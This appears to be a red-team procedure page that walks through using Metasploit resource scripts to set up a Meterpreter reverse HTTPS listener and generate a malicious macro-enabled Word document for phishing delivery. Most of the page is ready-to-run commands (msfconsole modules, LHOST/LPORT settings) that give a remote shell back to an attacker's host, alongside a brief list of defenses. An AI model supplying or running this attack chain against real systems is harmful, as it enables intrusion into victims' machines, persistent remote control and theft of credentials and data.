---
id: cedfd679-02da-475f-a9ce-a19a34af8651
name: Metasploit-Scripting-with-Meterpreter-Reverse-HTTPS-Payload
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.654432+00:00'
updated_at: '2023-04-10T20:25:00.988396+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Office Application Startup|T1137 - Office Application Startup]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - '[[techniques/Web Service|T1102 - Web Service]]'
sub_techniques:
  - '[[sub-techniques/Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Scripting-Metasploit]]'
commands:
  - '[[commands/create-metasploit-rc-file]]'
  - '[[commands/edit-metasploit-rc-file]]'
  - '[[commands/generate-office-word-macro-with-meterpreter-payload]]'
  - '[[commands/run-msfconsole-with-rc-file]]'
  - '[[commands/start-meterpreter-reverse-https-handler]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Metasploit-Scripting-with-Meterpreter-Reverse-HTTPS-Payload

## Summary

This procedure automates the setup and generation of a malicious Microsoft Office Word document containing a Meterpreter reverse HTTPS payload using Metasploit's resource scripting. It enables attackers to deliver the payload via social engineering, establishing a command-and-control channel upon victim execution of the macro-enabled document.

## Description

Metasploit Framework allows scripting of exploits and payloads through resource (.rc) files, which automate console commands for efficiency and repeatability. In this scenario, the procedure targets Windows environments vulnerable to macro execution in Office applications. The reverse HTTPS payload evades basic network filters by tunneling over HTTPS, providing encrypted command-and-control. Once the victim opens the generated .doc file and enables macros, the payload executes, connecting back to the attacker's listener for post-exploitation activities like data exfiltration or persistence. This is commonly used in red team simulations to test macro security controls and endpoint detection.

## Requirements

1. Metasploit Framework installed on the attacker's Kali Linux or similar machine.
2. Network accessibility for the attacker to receive inbound connections on the specified LPORT (e.g., 443 or 4646 to mimic HTTPS traffic).
3. Basic knowledge of Metasploit console syntax.
4. Target victim using Microsoft Office on Windows with macros enabled (often via phishing delivery).

## Defense

- Disable macros by default in Office applications and enforce strict policy via Group Policy.
- Monitor for anomalous outbound HTTPS connections to non-standard IPs/ports using network intrusion detection systems (NIDS).
- Deploy endpoint detection and response (EDR) tools to block unsigned macro execution and PowerShell spawning from Office processes.
- Educate users on phishing risks and verify document sources before enabling content.

## Objectives

1. Automate the configuration and generation of a macro-enabled Word document with embedded Meterpreter payload.
2. Establish a persistent, encrypted reverse shell connection from the victim machine.
3. Enable post-exploitation tasks such as credential dumping or lateral movement.

## Instructions

### Step 1: Create Metasploit Resource File

**Context**: Begin by creating an empty resource file (.rc) that will hold the scripted Metasploit commands for setting up the handler and generating the payload. This file automates the process to avoid manual entry in the console.

**Command** ([[commands/create-metasploit-rc-file]]):
```bash
touch exploit.rc
```

> This command creates a new empty file named 'exploit.rc' in the current directory. Verify creation with 'ls -la exploit.rc' to ensure the file exists and is writable.

### Step 2: Edit and Populate Resource File

**Context**: Open the resource file and insert the scripted commands for the handler and Word macro exploit. This step configures the payload, listener, and file generation in one automated sequence.

**Command** ([[commands/edit-metasploit-rc-file]]):
```bash
nano exploit.rc
```

> Use a text editor like nano to add the content. Paste the following scripted commands into the file (sourced from [[codes/metasploit-rc-content-for-word-macro-reverse-https]]). Save and exit (Ctrl+O, Enter, Ctrl+X in nano). The script sets up a background handler and generates a malicious .doc file named 'document.doc' by default.

**Code** ([[codes/metasploit-rc-content-for-word-macro-reverse-https]]):

```msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z

use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

> Expected: The file 'exploit.rc' now contains the multi-line script. Verify with 'cat exploit.rc' to confirm the commands are correctly formatted (one per line, no extra spaces).

### Step 3: Run Metasploit Console with Resource Script

**Context**: Execute the resource file in Metasploit to automate the handler startup and payload generation. This runs the scripted commands sequentially, producing the malicious Word document.

**Command** ([[commands/run-msfconsole-with-rc-file]]):
```bash
msfconsole -r ./exploit.rc
```

> This launches msfconsole and processes the .rc file, starting the handler in the background and generating 'document.doc' with the embedded macro payload. Monitor the console output for successful module loading and file creation. The handler will listen for incoming sessions.

### Step 4: Alternative - Start Handler Manually (If Not Scripted)

**Context**: If preferring manual setup, start the reverse HTTPS handler separately before generating the payload. This ensures the listener is active for immediate connections.

**Command** ([[commands/start-meterpreter-reverse-https-handler]]):

```msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```

> Run this in an active msfconsole session. Expected: 'Handler started' message, with the listener binding to all interfaces on port 4646. No session opens until the payload executes on the target.

### Step 5: Alternative - Generate Word Macro Payload Manually (If Not Scripted)

**Context**: Manually configure and run the Office Word macro exploit module to create the malicious document. Use this after starting the handler for non-scripted workflows.

**Command** ([[commands/generate-office-word-macro-with-meterpreter-payload]]):

```msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

> Run in msfconsole. Expected: Generation of 'document.doc' in the current directory, containing the VBA macro that downloads and executes the Meterpreter stager. Verify with 'ls -la *.doc' and test in a safe environment.
